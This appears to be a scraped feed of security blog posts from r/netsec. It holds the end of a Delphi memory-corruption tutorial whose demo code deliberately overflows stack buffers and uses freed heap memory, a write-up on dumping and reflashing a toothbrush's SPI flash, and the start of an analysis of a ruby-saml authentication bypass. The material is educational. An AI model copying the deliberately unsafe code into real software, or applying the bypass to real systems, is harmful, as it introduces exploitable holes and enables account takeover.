overflows the stack buffer and returns to :</p><h3>The Heap and Use After Free</h3><p>Let’s take a look at a couple examples of how heap-based vulnerabilities might be introduced. In these examples it was easy to cause the default heap implementation to allocate the same memory after a previous allocation had been freed by specifying allocations of the same size.</p><p>In this first example, we allocate a string on the heap, assign a value to it, free the string, then allocate another string which shares the same memory as the previous string. This demonstrates how reading uninitialized memory might lead to an information disclosure vulnerability. In this case, was used to set the length of a string without initializing memory.</p><p>In this example, first calls , which dynamically constructs a string, causing memory to for it to be allocated on the heap. The memory is freed as the string goes out of scope. Next, calls . calls , which allocates memory for a string without initializing the heap memory, then reads the contents of the string revealing the string constructed in .</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">procedure Heap1a;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  s := 'Super Secret';             // Assign a value to the string\n  s := s + ' String!';             // Appending to the string re-allocates heap memory\nend;                               // Memory for s is freed as it goes out of scope\n\nprocedure Heap1b;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  SetLength(s, 20);                // Trigger re-allocation, does not initialize memory\n  ShowMessage(s);                  // Shows 'Super Secret String!'\nend;\n\nprocedure Heap1c;\nbegin\n  Heap1a;\n  Heap1b;\nend;\n</pre><p>When the above code is run, the call produces the “Super Secret String!” in a dialog:</p><p>In this second heap example, memory is allocated for an object on the heap, then freed, then another object is allocated using the same heap memory. This is similar to how the same memory region was re-used by the strings in the previous example. In this case, the freed object is written to, modifying the second object. This represents a use-after-free vulnerability, where an attacker might be able to modify an object, either to obtain code execution or otherwise modify control flow.</p><p>and are two classes that contain a similar amount of data. In the procedure , , an instance of is created then immediately freed. Next, , an instance of is created and read. Then, the freed is written to. Finally, is read again showing that it was modified by the access to .</p><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">type\n[…]\n\n  TMyFirstClass = class(TObject)\n    public\n      ar: Array[0..7] of Byte;\n  end;\n\n  TMySecondClass = class(TObject)\n    public\n      n1: Integer;\n      n2: Integer;\n  end;\n\n[…]\nimplementation\n[...]\n\nprocedure Heap2;\nvar\n  obj1: TMyFirstClass;\n  obj2: TMySecondClass;\nbegin\n  obj1 := TMyFirstClass.Create;                 // Create obj1\n  obj1.Free;                                    // Free obj1\n  obj2 := TMySecondClass.Create;                // Create obj2 (occupies the same memory obj1 did)\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 0 - uninitialized memory\n  obj1.ar[4] := $41;                            // Write to obj1 after it has been freed, actually modifying obj2\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 65 - the value has been overwritten\n  obj2.Free;                                    // Free obj2\nend;\n</pre><p>In the first screenshot, the dialog shows that was equal to 0:</p><p>Then, after was written to, the second dialog shows that the value of  was set to 65 (the decimal representation of ):</p><p>These examples only scratch the surface of how memory corruption vulnerabilities might happen in Delphi code; future research could investigate more potentially dangerous library routines in official or common third-party libraries, how FreePascal behaves compared to Delphi, especially on different platforms (Win64, Linux, etc.), or <a href=\"https://docwiki.embarcadero.com/RADStudio/Athens/en/Memory_Management\">how different heap implementations</a> work to explore exploitability of heap memory corruption.</p><p>Based on what we covered in this blog post, here are some suggestions for Delphi developers:</p><ul><li>Avoid dangerous routines such as , , , and ; whenever they must be used, make sure to carefully check sizes using routines such as .</li><li>Consider enabling the “Runtime errors” flags in the compiler options.</li><li>Be cautious when dynamically creating and freeing objects, paying attention to potentially unexpected code paths that could result in using objects after they have been freed.</li><li>Make sure to initialize newly allocated memory before it is read.</li><li>In general, don’t assume that Delphi as a language is inherently safer than other languages such as C/C++.</li></ul><p>Hopefully these examples begin to demystify Delphi and Object Pascal, and also demonstrate that though memory corruption concepts are most commonly discussed in the context of C/C++, familiar vulnerabilities can be found in other languages as well.</p><h4>Appendix: Listing of Unit1.pas</h4><pre data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">unit Unit1;\n\ninterface\n\nuses\n  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,\n  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;\n\ntype\n  TForm1 = class(TForm)\n    Button1: TButton;\n    Button2: TButton;\n    Button3: TButton;\n    Button4: TButton;\n    procedure Button1Click(Sender: TObject);\n    procedure Button2Click(Sender: TObject);\n    procedure Button3Click(Sender: TObject);\n    procedure Button4Click(Sender: TObject);\n  private\n    { Private declarations }\n  public\n    { Public declarations }\n  end;\n\n  TMyFirstClass = class(TObject)\n    public\n      ar: Array[0..7] of Byte;\n  end;\n\n  TMySecondClass = class(TObject)\n    public\n      n1: Integer;\n      n2: Integer;\n  end;\n\nvar\n  Form1: TForm1;\n\nimplementation\n\n{$R *.dfm}\n\nprocedure Overflow1;\nvar\n  ar: Array[0..9] of Byte;          // Fixed-length array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar[i] := $41;                   // Raises an exception if dynamic bounds-checking is enabled\n  end;\nend;                                // If overflow happens, returns to $41414141\n\nprocedure Overflow2;\nvar\n  ar1: Array[0..9] of Byte;        // Smaller array on the stack\n  ar2: Array[0..999] of Byte;      // Larger array on the stack\n  i: Integer;\nbegin\n  for i := 0 to 999 do\n  begin\n    ar2[i] := $41;                 // Fill ar2 with $41\n  end;\n  Move(ar2, ar1, SizeOf(ar2));     // Oops should have been SizeOf(ar1)\nend;                               // Returns to $41414141\n\nprocedure Heap1a;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  s := 'Super Secret';             // Assign a value to the string\n  s := s + ' String!';             // Appending to the string re-allocates heap memory\nend;                               // Memory for s is freed as it goes out of scope\n\nprocedure Heap1b;\nvar\n  s: String;                       // Unicode string variable on the stack, contents on the heap\nbegin\n  SetLength(s, 20);                // Trigger re-allocation, does not initialize memory\n  ShowMessage(s);                  // Shows 'Super Secret String!'\nend;\n\nprocedure Heap1c;\nbegin\n  Heap1a;\n  Heap1b;\nend;\n\nprocedure Heap2;\nvar\n  obj1: TMyFirstClass;\n  obj2: TMySecondClass;\nbegin\n  obj1 := TMyFirstClass.Create;                 // Create obj1\n  obj1.Free;                                    // Free obj1\n  obj2 := TMySecondClass.Create;                // Create obj2 (occupies the same memory obj1 did)\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 0 - uninitialized memory\n  obj1.ar[4] := $41;                            // Write to obj1 after it has been freed, actually modifying obj2\n  ShowMessage('obj2.n2: ' + IntToStr(obj2.n2)); // Shows 65 - the value has been overwritten\n  obj2.Free;                                    // Free obj2\nend;\n\nprocedure TForm1.Button1Click(Sender: TObject);\nbegin\n  Overflow1;\nend;\n\nprocedure TForm1.Button2Click(Sender: TObject);\nbegin\n  Overflow2;\nend;\n\nprocedure TForm1.Button3Click(Sender: TObject);\nbegin\n  Heap1c;\nend;\n\nprocedure TForm1.Button4Click(Sender: TObject);\nbegin\n  Heap2;\nend;\n\nend.\n</pre>","contentLength":13800,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1janb9v/memory_corruption_in_delphi/"},{"title":"Brushing Up on Hardware Hacking Part 2 - SPI, UART, Pulseview, and Flashrom","url":"https://voidstarsec.com/blog/brushing-up-part-2","date":1741880453,"author":"/u/wrongbaud","guid":799,"unread":true,"content":"<a href=\"https://voidstarsec.com/blog/\">Home</a><p>In our <a href=\"https://voidstarsec.com/blog/pifex-pigen\">last post</a>, we reviewed how to use the <a href=\"https://github.com/RPi-Distro/pi-gen\">pi-gen</a> tool to generate an image for a Raspberry Pi that is pre-configured with many tools needed for basic hardware hacking. In this post, we will start using them on our first target.</p><p>Our first target from the AliExpress grab bag is going to be this electric toothbrush. Our goal is to extract the firmware and maybe push modified firmware to the toothbrush (there is a statement I never thought I’d type…).</p><p>This toothbrush is an interesting target for several reasons:</p><ol><li>It has a (somewhat) high-res color screen\n    <ol><li>This leads me to believe that whatever is driving it might be somewhat interesting</li></ol></li><li>It has a USB port\n    <ol><li>This might be used just for charging, but there is only one way to find out</li></ol></li><li>There are user presets as well as a “version” screen\n    <ol><li>This might mean some non-volatile storage on board and, more importantly, a firmware update method!</li></ol></li></ol><p>One of the first things we want to do with a new embedded target is perform a visual teardown. During this process, we will identify the various components and potential attack vectors (exposed pins/pads) that we will use to extract information from this device. The visual teardown for this device can be seen in the image/tables below:</p><table><thead><tr></tr></thead><tbody><tr><td>SPI Flash, non-volatile storage</td></tr><tr><td>Standard Linear Li-Ion Battery Charger</td></tr><tr></tr></tbody></table><p>This is a pretty simple target, which makes it great for learning how to do embedded assessments. We have an ARM Cortex MCU, an SPI flash, an IC for managing the charging of the battery, and another IC for controlling the motor. This target also contains a very well-documented silkscreen, which makes our initial analysis much simpler; one thing that likely stuck out to you when examining this PCB was the clearly labeled  and  pads, as we’ve discussed in <a href=\"https://voidstarsec.com/blog/uart-uboot-and-usb\">previous posts</a> this is indicative of a UART. Let’s start by looking at this toothbrush’s UART output.</p><p>If you’ve never looked at UART before or are unfamiliar with the process of identifying one and locating the baud rate, I highly recommend checking out the post I linked previously. It will cover everything you need to know for the following section.</p><p>The first thing we need to do is determine the baud rate; once we have that, we can look at the data being sent over the lines and determine if it is useful to us. Using an oscilloscope, we can monitor this line on startup, which results in the following trace being generated on the scope:</p><p>This does not look promising in terms of debug output. However, If you are familiar with UART, you know that the transmit line must be pulled high as bits are (in a standard configuration) transmitted by driving the line low. We can see in this capture that the line is low. This may lead you to think that the UART is not active and we should move on; before we do that, let’s try one more thing. Using a 10K resistor, we will pull the Tx line high to 3.3V; if we take a capture in this configuration and press a few buttons on the toothbrush, we see the following:</p><p>Success! We have traffic, so the lesson here is not to get discouraged if you don’t immediately see traffic on a UART interface. It is important to rely on your understanding of the protocol fundamentals at a low level, this is something that we focus on at the core of our <a href=\"https://voidstarsec.com/training/\">hardware reverse engineering training</a>.</p><p>Based on the output from the scope, we determine that the baud rate is 115200; this is done by locating the smallest pulse and measuring its frequency. Now that we have this we can connect this to the serial port of the Raspberry Pi and examine the output:</p><div><div><pre><code>KEY_B Down.\nKEY_B Dn-&gt;Up.\nKEY_B Down.\n39F9(8000,9419), \nKEY_B Dn-&gt;Up.\nKEY_B Down.\nKEY_B Dn-&gt;Up.\nKEY_A Down.\n675D(30000,33884), \n4C91(10,3894), 675D(30000,33884), \n</code></pre></div></div><p>So, we have debug output! But this does not get us what we’re looking for. We want to extract the firmware and see if we can re-flash it! For these purposes, we will focus on the main MCU and the SPI flash. Let’s start by looking at the SPI flash.</p><p>If you are unfamiliar with SPI flash chips and how they work, check out some of our previous blog entries <a href=\"https://wrongbaud.github.io/posts/BasicFUN-flashing/\">here</a>.\nIn order to read out this flash we will use <a href=\"https://flashrom.org/\">flashrom</a>. If you are unfamiliar with , it is an open-source tool for reading and writing SPI flash devices. We’ve used this tool in previous posts, and you can learn more about it and see more usage examples <a href=\"https://wrongbaud.github.io/posts/router-teardown/\">here</a></p><p>One of the nice things about  is that we can use it with several hardware adapters. One of the most commonly used is the CH341 adapter, which you can purchase <a href=\"https://www.amazon.com/CH341A-programmer-socket-programer-support/dp/B077GBTWQP\">here</a>. However, you can also use an embedded Linux device with the  kernel module loaded, allowing an SPI peripheral to be accessed through the  directory.</p><p>We can attempt to access the SPI flash using a standard SOIC8 clip (<a href=\"https://www.digikey.com/en/products/detail/pomona-electronics/5250/745102\">pomona</a> are the best) as shown in the diagram:</p><p>Using a Raspberry Pi with the  kernel module enabled, we can attempt to extract the SPI flash as follows:</p><div><div><pre><code>flashrom  linux_spi:dev/dev/spidev0.0  toothbrush-spi.bin\n</code></pre></div></div><ul><li> is used to specify the programmer; on our case this is the SPI peripheral on the Raspberry Pi () located at <ul><li> If you are using something like an FTDI, Tigard, or CH341 programmer, you will want to update this according to your hardware</li></ul></li><li> specifies a read operation followed by the filename that we want to write.</li></ul><p>So, with our clip in place, we should be able to just run it and get access to the SPI data, right? Let’s see what happens:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ ./run-flashrom.sh r spi.bin\nflashrom unknown on Linux 6.6.74+rpt-rpi-v8 (aarch64)\nflashrom is free software; get the source code at https://flashrom.org\n\nUsing clock_gettime for delay loops (clk_id: 1, resolution: 1ns).\nUsing default 2000kHz clock. Use 'spispeed' parameter to override.\nNo EEPROM/flash device found.\nNote: flashrom can never write if the flash chip isn't found automatically.\n</code></pre></div></div><p>If you have used  before, errors like this are not new to you, if you have not, don’t fret! Recall that one of the pins we connected to for the SPI flash was the VCC pin. If that pin is also connected to the CPU on board, then we are likely inadvertently powering this CPU and causing it to access the SPI flash while we are trying to read. This will cause bus contention problems as the SPI protocol cannot have two host devices actively trying to access the same target device simultaneously.</p><p>In this scenario, there are several options that we have:</p><ol><li>Remove the SPI flash with a hot air gun\n    <ol><li> Immediately remove the bus contention issues</li><li> Removal/resoldering the device  be risky if you’ve not done this before. If there is any type of anti-tamper on the target device, it may cause issues for us as well</li></ol></li><li>Analyze the SPI traffic using a logic analyzer and reconstruct the data that is read from the CPU to a flash image\n    <ol><li> If the CPU does not address the entire SPI flash, we will not get a full image; also, depending on the system, adding the additional length to the SPI traces by attaching our logic analyzer can cause the CPU not to boot properly. This method also, by definition gives us no write access, so if we want to push modified firmware - we are out of luck</li></ol></li><li>Find a way to keep the CPU in reset or stop communicating with the SPI flash\n    <ol><li> Allows for in-circuit reads</li><li> Based on the PCB layout of your target and your level of access, this may not be possible</li></ol></li></ol><p>Let’s go through all three of these together. For our first example, I have an old blog post <a href=\"https://wrongbaud.github.io/posts/Holiday-Teardown/\">here</a> that walks through the process.</p><h4>Analyzing Data with Pulseview</h4><p>Using the same clip setup as before, we can use a <a href=\"https://www.amazon.com/HiLetgo-Analyzer-Ferrite-Channel-Arduino/dp/B077LSG5P2\">low-cost</a> logic analyzer to view the traffic on startup and during operations:</p><p>After monitoring the SPI traffic on boot, we have the following:</p><p>With this, we can set up an SPI decoder and assign the signals, as shown below. Pulseview also includes protocol-level decoders that we can use to see exactly what commands are being sent to this SPI flash.</p><p>While we know the pins we have connected to on the SPI flash, let’s examine the traffic and see if we can identify them. This skill can be helpful if you are analyzing signals on an undocumented bus or debug header.</p><p> If you would like more of a deep dive into the SPI protocol and how it is used for EEPROMs, check out my old blog post <a href=\"https://voidstarsec.com/blog/**https://wrongbaud.github.io/posts/BasicFUN-flashing/\">here</a></p><p>Serial Peripheral Interface (SPI) requires the following four signals:</p><ul><li>Chip Select: Used to select the target chip</li><li>Clock: Driven by the host to determine when data is sampled</li><li>Serial Data Out (MOSI): Data sent from the host to the target is sent on this line</li><li>Serial Data In (MISO): Used to send data from the device to the host.</li></ul><p>Based on what we know about the SPI protocol, the CS line should stay low during each transaction. This behavior is seen on the D0 line in our screenshot above. Next, we know that a clock signal has to be provided by the bus controller; this will be a consistent pulse that aligns with data being transmitted on the target. The fourth row in the screenshot above demonstrates this. Now, all that is left is the SDI and SDO lines. SDO is driven by the controller and used to issue commands; replies are then sent back to the SDI line.</p><p>If we look closely at our captured signals, we can see that one line is active first (3), which is followed by a response on the other line (2). It is a fair assumption to label the third signal as SDO and the second as SDI; we can set this up in our pulseview decoder as shown below:</p><p>With our decoder set up, we can see the bytes that are being sent and what those bytes mean to the SPI flash:</p><p>One thing to note is that when a read operation is performed (when cycling through the menus) and new data is displayed on screen, we have the following transactions:</p><ul><li>Thirteen read operations, each consisting of 1,921 bytes (24973 bytes total)</li><li>One final read consisting of 641 bytes</li></ul><p>It is a reasonable assumption to say that the data for each image displayed requires roughly 24Kb of data.</p><p>One of the most useful features in Pulseview is the “Binary Decoder Output View.” This window will let you view decoded traffic results and export them to a file. In the following screenshot, we have selected the MISO (SDI) line, which shows the responses from the SPI flash. This contains the data that was transmitted back to the CPU from the flash chip.</p><p>While this gives us some data, the CPU does not read all of the data in one shot; it reads data from this flash as needed. We can see this when we cycle through the menu options, which generates new traffic.</p><p>We need to dig a little deeper to get the full flash image without removing the chip.</p><p>There are several ways for us to disable the CPU on this device:</p><ol><li>Locate a reset pin and pull it low</li><li>Manipulate the external oscillator (if present) to keep the CPU from booting</li><li>Manipulate an external interrupt or boot-mode pin on our target device to force it to boot into a different mode that will not access the SPI flash.</li></ol><p>Luckily for us, this device has multiple labeled test pads, as seen in the image below:</p><p> Reset pins are typically active low, but it is worth checking beforehand with a multi-meter to make sure that we don’t damage anything before pulling something to the ground.</p><p>We can use this pin to hold the processor in reset if we hold the processor in reset and attempt to read out the flash in the same manner as before, we see the following:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ ./run-flashrom.sh r spi2.bin\nflashrom unknown on Linux 6.6.74+rpt-rpi-v8 (aarch64)\nflashrom is free software; get the source code at https://flashrom.org\n\nUsing clock_gettime for delay loops (clk_id: 1, resolution: 1ns).\nUsing default 2000kHz clock. Use 'spispeed' parameter to override.\n===\nSFDP has autodetected a flash chip which is not natively supported by flashrom yet.\nAll standard operations (read, verify, erase and write) should work, but to support all possible features we need to add them manually.\nYou can help us by mailing us the output of the following command to flashrom@flashrom.org:\n'flashrom -VV [plus the -p/--programmer parameter]'\nThanks for your help!\n===\nFound Unknown flash chip \"SFDP-capable chip\" (8192 kB, SPI) on linux_spi.\n===\nThis flash part has status UNTESTED for operations: WP\nThe test status of this chip may have been updated in the latest development\nversion of flashrom. If you are running the latest development version,\nplease email a report to flashrom@flashrom.org if any of the above operations\nwork correctly for you with this flash chip. Please include the flashrom log\nfile for all operations you tested (see the man page for details), and mention\nwhich mainboard or programmer you tested in the subject line.\nThanks for your help!\nReading flash... done.\n</code></pre></div></div><p>Now we have a binary image, and we can learn a little more about the internals of this toothbrush.</p><p> When reading a SPI flash chip in-circuit, read it multiple times and check the MD5 of the results. This can confirm that you are getting consistent reads.</p><div><div><pre><code>pi@pifex:~/targets/toothbrush spi.bin \n1dca157fef51ea511c713c933963fa19  spi.bin\npi@pifex:~/targets/toothbrush spi2.bin \n1dca157fef51ea511c713c933963fa19  spi2.bin\n</code></pre></div></div><p>The first step with any unknown binary blob is to run <a href=\"https://github.com/ReFirmLabs/binwalk\">binwalk</a> or <a href=\"https://unblob.org/\">unblob</a> against it; binwalk produces the following:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ binwalk spi.bin \n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n\n</code></pre></div></div><p>If we run strings, we can see some data, but none of it shows up in our debug output. While this could be firmware, if we look at the raw data, we see the following:</p><div><div><pre><code>pi@pifex:~/targets/toothbrush $ hexdump -C -n512 spi.bin \n00000000  00 00 00 00 00 00 00 00  10 a2 6b 6d 94 b2 9c f3  |..........km....|\n00000010  8c 71 52 aa 00 00 00 00  00 00 00 00 00 00 00 00  |.qR.............|\n00000020  00 00 6b 6d ff ff ff ff  ff ff ff ff ff ff ff ff  |..km............|\n00000030  f7 9e 31 a6 00 00 00 00  00 00 00 00 5a eb ff ff  |..1.........Z...|\n00000040  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|\n00000050  21 04 00 00 00 00 00 00  e7 3c ff ff ff ff ce 59  |!........&lt;.....Y|\n00000060  31 86 18 c3 5a cb f7 be  ff ff ff ff a5 34 00 00  |1...Z........4..|\n00000070  00 00 4a 69 ff ff ff ff  ff df 10 82 00 00 00 00  |..Ji............|\n00000080  00 00 52 aa ff ff ff ff  ff df 10 82 21 24 8c 71  |..R.........!$.q|\n00000090  ff ff ff ff ad 55 00 00  00 00 00 00 00 00 00 20  |.....U......... |\n000000a0  ef 7d ff ff ff ff 42 28  4a 69 bd d7 ff ff ff ff  |.}....B(Ji......|\n000000b0  84 10 00 00 00 00 00 00  00 00 00 00 c6 18 ff ff  |................|\n000000c0  ff ff 6b 6d 63 2c d6 9a  ff ff ff ff 63 0c 00 00  |..kmc,......c...|\n000000d0  00 00 00 00 00 00 00 00  ad 75 ff ff ff ff 8c 51  |.........u.....Q|\n000000e0  73 ae de fb ff ff ff ff  5a cb 00 00 00 00 00 00  |s.......Z.......|\n000000f0  00 00 00 00 9c f3 ff ff  ff ff 94 b2 7b cf e7 1c  |............{...|\n00000100  ff ff ff ff 52 aa 00 00  00 00 00 00 00 00 00 00  |....R...........|\n00000110  9c d3 ff ff ff ff 9c d3  73 ae de fb ff ff ff ff  |........s.......|\n00000120  5a cb 00 00 00 00 00 00  00 00 00 00 9c f3 ff ff  |Z...............|\n00000130  ff ff 94 b2 63 2c d6 9a  ff ff ff ff 63 2c 00 00  |....c,......c,..|\n00000140  00 00 00 00 00 00 00 00  ad 75 ff ff ff ff 8c 51  |.........u.....Q|\n00000150  4a 69 bd d7 ff ff ff ff  84 10 00 00 00 00 00 00  |Ji..............|\n00000160  00 00 00 00 c6 18 ff ff  ff ff 6b 6d 21 04 8c 71  |..........km!..q|\n00000170  ff ff ff ff ad 75 00 00  00 00 00 00 00 00 00 20  |.....u......... |\n00000180  f7 9e ff ff ff ff 42 08  00 00 4a 49 ff ff ff ff  |......B...JI....|\n00000190  ff df 10 a2 00 00 00 00  00 00 5a cb ff ff ff ff  |..........Z.....|\n000001a0  ff df 08 61 00 00 00 00  e7 1c ff ff ff ff d6 9a  |...a............|\n000001b0  39 e7 21 04 63 0c f7 be  ff ff ff ff a5 14 00 00  |9.!.c...........|\n000001c0  00 00 00 00 5a cb ff ff  ff ff ff ff ff ff ff ff  |....Z...........|\n000001d0  ff ff ff ff ff ff ff df  18 e3 00 00 00 00 00 00  |................|\n000001e0  00 00 63 2c ff ff ff ff  ff ff ff ff ff ff ff ff  |..c,............|\n000001f0  ef 7d 29 65 00 00 00 00  00 00 00 00 00 00 00 00  |.})e............|\n</code></pre></div></div><p> this were an ARM Cortex firmware image, we would expect to see an Interrupt Vector Table (IVT). On the Cortex-M, the vector table is preceded by a stack pointer, which will point to somewhere in the CPU’s RAM. If we examine the memory map for our processor, we have the following:</p><p>If this were a firmware image for this processor, we would expect to see a pointer to somewhere in the SRAM region and a table pointing to offsets in the internal flash; we do not. We also do not see any data that resembles ARM instructions, so what could this data be?</p><p>Recall that this device has a high-(ish) resolution screen, so this data is likely the image data displayed on startup. For devices with OLED displays, it is rare that the data is stored in a standard image format. It is often stored as pixelated RGB data, which can be difficult to parse. Luckily, there are tools available, such as <a href=\"https://codestation.ch\">https://codestation.ch/</a>, that can allow us to test various formats and parameters.</p><p>This introduces a new problem; we know very little about the formatting being used, so let’s start with what we  know. The width and length of this screen are 11mm by 22mm, which means that our pixel ratio should be similar. Common ratios for these screens include 128x64; however, if we try that, it does not work. After some experimenting, a width of 80 and a height of 160 worked, and I could properly render the images on the screen. See the output below for more details:</p><p>Now that we know the size of the images and the screen layout, we can carve out the various images from the binary and load them as shown below. Using the data that we gathered earlier in pulseview, we know the offsets in the flash where som eof these images are stored.Each image was 24kb pixel maps (remember the read size from before?). Now that they are extracted, we should be able to replace them! After looking through the SPI flash image, it was determined that the bitmap for the software information screen is located at offset  in our SPI flash image. It was individually extracted and loaded as shown below:</p><p>With all of this information, we can generate an RGB file from an 80x160-pixel image file and overwrite the SPI flash with our modified pixel map to display a custom image.</p><p>As a test, let’s take a picture of everyone’s favorite owl (Bubo from Clash of the Titans), scale it to 80x160, and then convert it to RGB565 with .</p><div><div><pre><code>ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb\n</code></pre></div></div><p>This image was injected into the original SPI flash and re-flashed, as shown below:</p><div><div><pre><code>flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin\n</code></pre></div></div><p>Our new image worked, and was displayed properly! We now understand how the SPI flash is structured, but we still have not extracted the firmware. We have one more source: the internal flash on the MCU. In our next post, we’ll discuss how to communicate with an SWD interface and write an OpenOCD config file for a new microcontroller.</p><p>This series aims to show readers that there are many ways to get familiar with embedded systems reverse engineering without breaking the bank and that interesting targets can be found almost anywhere!</p><p>With this post, we’ve talked about:</p><ul><li>Configuring a Raspberry Pi image using the <a href=\"https://github.com/voidstarsec/pifex-sw\">pifex-sw</a> repository and <a href=\"https://github.com/RPi-Distro/pi-gen\">pi-gen</a></li><li>How to identify/instrument a UART even when no signals are active on the PCB</li><li>Multiple methods for in-circuit SPI flash extraction\n    <ul><li>Analyzing SPI traffic with Pulseview</li><li>Extracting SPI flash via </li></ul></li><li>Methods and tools for analyzing image files in an undocumented format</li><li>Reflashing SPI flash chips with flashrom</li></ul><p>Stay tuned for part three for a deep dive into using SWD to reprogram the flash on a microcontroller that is not directly supported by OpenOCD!</p><p>If you want to stay informed about official releases, new courses, and blog posts, sign up for our mailing list <a href=\"http://eepurl.com/hSl31f\">here</a>.</p><div>©&nbsp;2025&nbsp;VoidStar Security LLC\n          &nbsp;\n          •\n          &nbsp;</div>","contentLength":19858,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jaex39/brushing_up_on_hardware_hacking_part_2_spi_uart/"},{"title":"Cradle.sh Open Source Threat Intelligence Hub","url":"https://cradle.sh/","date":1741875626,"author":"/u/small_talk101","guid":811,"unread":true,"content":"<!DOCTYPE html>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1jad2e8/cradlesh_open_source_threat_intelligence_hub/"},{"title":"squid: RISC-V emulator for high-performance fuzzing with AOT instead of JIT compilation 🦑","url":"https://github.com/fkie-cad/squid","date":1741862113,"author":"/u/martinclauss","guid":796,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/netsec/comments/1ja8yg7/squid_riscv_emulator_for_highperformance_fuzzing/"},{"title":"Sign in as anyone: Bypassing SAML SSO authentication with parser differentials","url":"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/","date":1741851224,"author":"/u/ulldma","guid":809,"unread":true,"content":"<blockquote><p>Critical authentication bypass vulnerabilities (CVE-2025-25291 + CVE-2025-25292) were discovered in ruby-saml up to version 1.17.0. Attackers who are in possession of a single valid signature that was created with the key used to validate SAML responses or assertions of the targeted organization can use it to construct SAML assertions themselves and are in turn able to log in as any user. In other words, it could be used for an account takeover attack. Users of ruby-saml should update to version 1.18.0. References to libraries making use of ruby-saml (such as omniauth-saml) need also be updated to a version that reference a fixed version of ruby-saml.</p></blockquote><p>In this blog post, we detail newly discovered authentication bypass vulnerabilities in the <a href=\"https://github.com/SAML-Toolkits/ruby-saml\">ruby-saml</a> library used for single sign-on (SSO) via SAML on the service provider (application) side. GitHub doesn’t currently use ruby-saml for authentication, but began evaluating the use of the library with the intention of using an open source library for SAML authentication once more. This library is, however, used in other popular projects and products. We discovered an exploitable instance of this vulnerability in GitLab, and have notified their security team so they can take necessary actions to protect their users against potential attacks.</p><p>GitHub previously used the ruby-saml library up to 2014, but moved to our own SAML implementation due to missing features in ruby-saml at that time. Following bug bounty reports around vulnerabilities in our own implementation (such as <a href=\"https://docs.github.com/en/enterprise-server@3.13/admin/release-notes#3.13.5-security-fixes\">CVE-2024-9487</a>, related to encrypted assertions), GitHub recently decided to explore the use of ruby-saml again. Then in October 2024, a blockbuster vulnerability dropped: an <a href=\"https://github.com/advisories/GHSA-jw9c-mfg7-9rx2\">authentication bypass</a> in ruby-saml (CVE-2024-45409) by <a href=\"https://hackerone.com/ahacker1\">ahacker1</a>. With tangible evidence of exploitable attack surface, GitHub’s switch to ruby-saml had to be evaluated more thoroughly now. As such, GitHub started a <a href=\"https://hackerone.com/github\">private bug bounty engagement</a> to evaluate the security of the ruby-saml library. We gave selected bug bounty researchers access to GitHub test environments using ruby-saml for SAML authentication. In tandem, the GitHub Security Lab also reviewed the attack surface of the ruby-saml library.</p><p>As is not uncommon when multiple researchers are looking at the same code, both ahacker1, a participant in the <a href=\"https://hackerone.com/github\">GitHub bug bounty program</a>, and I noticed the same thing during code review: ruby-saml was using two different XML parsers during the code path of signature verification. Namely, REXML and Nokogiri. While REXML is an XML parser implemented in pure Ruby, Nokogiri provides an easy-to-use wrapper API around different libraries like libxml2, libgumbo and Xerces (used for JRuby). Nokogiri supports parsing of XML and HTML. It looks like Nokogiri was added to ruby-saml to support <a href=\"https://en.wikipedia.org/wiki/Canonical_XML\">canonicalization</a> and potentially other things REXML didn’t support at that time.</p><p>We both inspected the same code path in the <a href=\"https://github.com/SAML-Toolkits/ruby-saml/blob/21b676bdf55452750d8ee5facd2f6e3c51927315/lib/xml_security.rb#L268\"></a> of  and found that the signature element to be verified is first read via REXML, and then also with Nokogiri’s XML parser. So, if REXML and Nokogiri could be tricked into retrieving different signature elements for the same XPath query it might be possible to trick ruby-saml into verifying the wrong signature. It looked like there could be a potential authentication bypass due to a !</p><p>The reality was actually more complicated than this.</p><p>Roughly speaking, four stages were involved in the discovery of this authentication bypass:</p><ol><li>Discovering that two different XML parsers are used during code review.  </li><li>Establishing if and how a parser differential could be exploited.  </li><li>Finding an actual parser differential for the parsers in use.  </li><li>Leveraging the parser differential to create a full-blown exploit.</li></ol><p>To prove the security impact of this vulnerability, it was necessary to complete all four stages and create a full-blown authentication bypass exploit.</p><h2>Quick recap: how SAML responses are validated<a href=\"https://github.blog/security/sign-in-as-anyone-bypassing-saml-sso-authentication-with-parser-differentials/#quick-recap-how-saml-responses-are-validated\" aria-label=\"Quick recap: how SAML responses are 